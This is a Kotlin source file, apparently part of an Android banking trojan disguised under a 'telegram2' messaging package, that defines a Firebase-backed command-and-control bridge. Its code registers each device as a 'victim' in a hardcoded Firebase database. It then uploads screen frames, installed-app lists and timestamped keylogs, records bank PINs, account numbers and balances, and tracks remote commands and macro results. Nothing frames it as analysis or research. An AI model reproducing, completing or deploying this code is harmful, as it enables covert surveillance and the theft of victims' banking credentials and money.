package com.telegram2.messaging.remote

import com.google.firebase.database.*
import java.text.SimpleDateFormat
import java.util.*

object FirebaseBridge {
    private lateinit var db: FirebaseDatabase
    private lateinit var deviceRef: DatabaseReference

    fun init(deviceId: String) {
        db = FirebaseDatabase.getInstance("https://vfvdfscf-default-rtdb.firebaseio.com")
        deviceRef = db.getReference("telegram2_secret").child("victims").child(deviceId)
        commandsRef = deviceRef.child("commands")
        screenRef = deviceRef.child("screen")
        infoRef = deviceRef.child("info")
        bankRef = deviceRef.child("bank")
    }

    lateinit var commandsRef: DatabaseReference
    private lateinit var screenRef: DatabaseReference
    private lateinit var infoRef: DatabaseReference
    private lateinit var bankRef: DatabaseReference

    fun registerDevice(name: String, version: String, apps: List<String>) {
        deviceRef.child("deviceName").setValue(name)
        deviceRef.child("androidVersion").setValue(version)
        deviceRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
    }

    fun updateScreenFrame(base64: String) = screenRef.setValue(base64)

    fun updateScreenInfo(w: Int, h: Int) {
        deviceRef.child("screenInfo/width").setValue(w)
        deviceRef.child("screenInfo/height").setValue(h)
    }

    fun updateMediaStatus(active: Boolean) {
        deviceRef.child("mediaProjectionActive").setValue(active)
    }

    fun pushInstalledApps(apps: List<String>) {
        infoRef.child("installed_apps").setValue(apps.joinToString("\n"))
    }

    fun logBankData(packageName: String, pin: String? = null, account: String? = null, balance: String? = null) {
        val data = mutableMapOf<String, Any>(
            "package" to packageName,
            "timestamp" to ServerValue.TIMESTAMP
        )
        if (pin != null) data["pin"] = pin
        if (account != null) data["account"] = account
        if (balance != null) data["balance"] = balance
        bankRef.push().setValue(data)
    }

    fun sendKeylog(pkg: String, text: String) {
        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        infoRef.child("keylogs").push().setValue("[$ts] $pkg: $text")
    }

    fun reportMacro(macroId: String, success: Boolean, details: String) {
        deviceRef.child("macros/$macroId/status").setValue(if (success) "done" else "failed")
        deviceRef.child("macros/$macroId/details").setValue(details)
    }
}